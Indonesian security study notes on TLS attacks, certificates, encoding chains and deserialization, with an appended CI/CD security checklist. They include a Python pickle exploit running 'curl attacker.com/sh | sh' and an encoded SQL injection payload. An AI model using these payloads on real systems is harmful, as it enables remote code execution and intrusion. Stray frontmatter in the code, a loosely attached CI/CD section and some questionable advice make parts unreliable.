
## Deepdive — Digital Plumbing (TLS, Cert, Encoding)

### Komponen Digital Plumbing

| Komponen | Fungsi | Attack Surface | Tool |
|----------|--------|---------------|------|
| **TLS/SSL** | Enkripsi transit | Downgrade, cert spoof, SNI leak | openssl, testssl |
| **Certificate (X.509)** | Identitas server | Mis-issuance, weak key, CA compromise | certbot, cfssl |
| **Encoding (Base64/Hex)** | Binary → text transit | Data smuggling, obfuscation | base64, xxd |
| **Serialization** | Object → byte stream | Deserialization RCE (Java, Python, .NET) | ysoserial, PHPGGC |
| **Compression** | Traffic reduction | CRIME/BREACH attack (info leak) | sslsniff |

### TLS Attack Chain

```
Recon: scan target → testssl.sh → TLS version, cipher, cert
    ↓
Attack:
  ├── Downgrade (TLS 1.3 → 1.2 → SSLv3) → weak crypto
  ├── SNI leak (TLS 1.2 plaintext SNI) → domain visible to ISP
  ├── Cert spoof (self-signed CA install) → MITM
  ├── Known-key attack (Heartbleed CVE-2014-0160) → key leak
  └→ CRIME/BREACH → compression + encrypted → info leak
    ↓
Defense:
  ├── TLS 1.3 only (disable 1.2/1.1)
  ├── HSTS preload → no downgrade
  ├── ECH (Encrypted Client Hello) → SNI hidden
  ├── Cert transparency → detect mis-issuance
  └→ Compression off (or safe)
```

### Deserialization RCE (Java)

```java
// Vulnerable: ObjectInputStream.readObject() pada input tidak terpercaya
// Attack: ysoserial generate payload → kirim ke endpoint → RCE
// Chaining: Commons Collections invoke → Runtime.exec()
// Defense: whitelist (ObjectInputFilter), no serialization external input
```

## Referensi
- TLS 1.3 (RFC 8446) — https://datatracker.ietf.org/doc/html/rfc8446
- Heartbleed — https://heartbleed.com/
- ysoserial — https://github.com/frohoff/ysoserial
- CRIME/BREACH — https://en.wikipedia.org/wiki/CRIME

## Konsep Dasar — Digital Plumbing (Layer Fundamental)

### Encoding & Modulation Data

| Format | Use | Tipe | Example |
|--------|-----|------|---------|
| **ASCII** | Text basic | 7-bit | A=65 |
| **UTF-8** | Unicode | 8-bit variable | ñ=0xC3 0xB1 |
| **Base64** | Binary→text | 6-bit | SGVsbG8= |
| **Hex** | Binary display | 4-bit | FF=0xFF |
| **URL encoding** | Web safe | % + hex | %20=space |

### Encoding Chain (Web Attack)

```
SQLi payload: ' OR 1=1--
  ↓ URL encode: %27%20OR%201%3D1--
  ↓ Double encode: %2527%2520OR%25201%253D1--
  ↓ Hex encode: 0x27204f5220313d312d2d
  ↓ Base64: JyBPUiAxPTEtLQ==
  ↓ Unicode: %u0027%20OR%201%3D1--
```

Setiap layer encoding bisa mencegah atau membantu serangan, tergantung siapa yang decode lebih dulu.

### Serialization Format

| Format | Tipe | Kelemahan | Tool |
|--------|------|-----------|------|
| **JSON** | Text | Prototype pollution, JSON injection | jq |
| **XML** | Text | XXE (XML External Entity) | XXExploiter |
| **Protobuf** | Binary | ReDoS (regex), format confusion | protoc |
| **Java Serialization** | Binary | RCE (deserialization) | ysoserial |
| **Python Pickle** | Binary | RCE (deserialization) | pickletools |
| **YAML** | Text | RCE (tag !!python/object) | pyyaml |

### Deserialization RCE Chain (Python Pickle)

```python
cssclasses:
  - wide-table
  - callout

# Attack payload (malicious pickle)
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/sh | sh',))

# serialize
payload = pickle.dumps(Exploit())

# victim: pickle.loads(payload) → os.system("curl ...") → RCE
```

### TLS/SSL Handshake Deepdive

```
Client                          Server
  | → ClientHello (cipher list, SNI, key share) → |
  | ← ServerHello (selected cipher, key share) ← |
  | ← Certificate (X.509 chain) ← |
  | ← ServerHelloDone ← |
  | → ChangeCipherSpec + Finished (encrypted) → |
  | ← ChangeCipherSpec + Finished (encrypted) ← |
  | → Application Data (HTTPS) → |
  | ← Application Data (HTTPS) ← |
```

### TLS Attack Surface

| Attack | Layer | CVE/Technique | Mitigation |
|-------|-------|---------------|-----------|
| **Downgrade** | Protocol | SSLstrip, DROWN | HSTS, TLS 1.3 only |
| **Heartbleed** | Implementation | CVE-2014-0160 | Patch OpenSSL |
| **POODLE** | Protocol | SSLv3 fallback | Disable SSLv3 |
| **CRIME/BREACH** | Compression | Info leak via ratio | Disable compression |
| **SNI Leak** | Handshake | ISP sees domain | ECH (Encrypted Client Hello) |
| **Cert Mis-issuance** | CA | Fake cert | Certificate Transparency |

### Certificate (X.509) Anatomy

| Field | Content | Example |
|-------|---------|---------|
| **Subject** | Domain | CN=example.com |
| **Issuer** | Who issued | CN=Let's Encrypt R3 |
| **Validity** | Date range | 2024-01-01 to 2025-01-01 |
| **Public Key** | RSA/ECDSA | 2048-bit RSA |
| **SAN (Subject Alt Name)** | Additional domains | *.example.com |
| **Serial** | Unique ID | 00:AB:CD... |
| **Signature** | CA signed | SHA-256 |

## Referensi
- TLS 1.3 (RFC 8446) — https://datatracker.ietf.org/doc/html/rfc8446
- Heartbleed — https://heartbleed.com/
- Deserialization OWASP — https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- Pickle Security — https://docs.python.org/3/library/pickle.html#restricting-globals

## Koneksi ke Vault & Cross-Reference

| Catatan | Hubungan |
|---------|----------|
| Zero Trust | Network segment untuk infra |
| Supply Chain | Pipeline security overlap |
| Cloud IAM | Privilege escalation path |
| Endpoint Security | Runner compromise path |

## Best Practices & Pitfall

1. **GitOps**: Infrastructure config (manifest) ada di Git — versioned, reviewed, auditable. Tetapi Git token = attack surface → rotate, scoped.
2. **Immutable Artifact**: Setiap build = image/untouched hash. Signature verification di deploy. Realitas: banyak still manual deploy.
3. **Least Privilege CI**: Runner token punya scope minimal — bukan global admin. Realitas: `repo:*` scope masih common di setup.
4. **Network Isolation**: Runner segment terpisah production → securitas blance. Tetapi: many org simplify by same VPC → risk.
5. **Audit Log**: Semua CI/CD action di-log dan immutable. Realitas: log retention pendek, alerting belum sentral.
6. **Provenance (SLSA)**: Setiap artifact terlampir provenance (build manifest + source hash). Realitas: adopsi masih rendah di 2025.

## Pitfall Nyata yang Sering Ditemui

- **Leaked token di git history**: git log → credential exposure → scanner attacker → compromise. Fix: BFG repo-cleaner + token rotation.
- **Runner has persistent secrets**: Runner VM menyimpan `~/.aws/credentials` atau `.docker/config.json` → next user can access. Fix: ephemeral runner, no persistent state.
- **Default branch is `main`**: CI jalan di `main`. PR branch dapat trigger → secret exposed. Fix: `pull_request_target` only trusted contributors.
- **Trusted Action pins tag not SHA**: Tag `actions/checkout@v4` → bisa di-hijack jika maintainer compromised. Fix: pin SHA.
- **No SBOM**: Artifact jadi → no manifest → maka after compromised, tidak tahu apa yang affected. Fix: `syft` generate SBOM pada build.

## Tool Stack Lengkap

| Tool | Stage | Use |
|------|-------|-----|
| **GitHub Actions / GitLab CI** | Build | Pipeline |
| **ArgoCD / Flux** | Deploy | GitOps continuous delivery |
| **Trivy / Grype** | Scan | Image + dep vuln scan |
| **Syft** | Scan | SBOM generation |
| **Cosign / Sigstore** | Sign | Artifact signing |
| **Open Policy Agent (OPA)** | Enforce | Policy as code |
| **HashiCorp Vault** | Secret | Secret management |
| **Prometheus + Grafana** | Monitor | Metrics + dashboard |
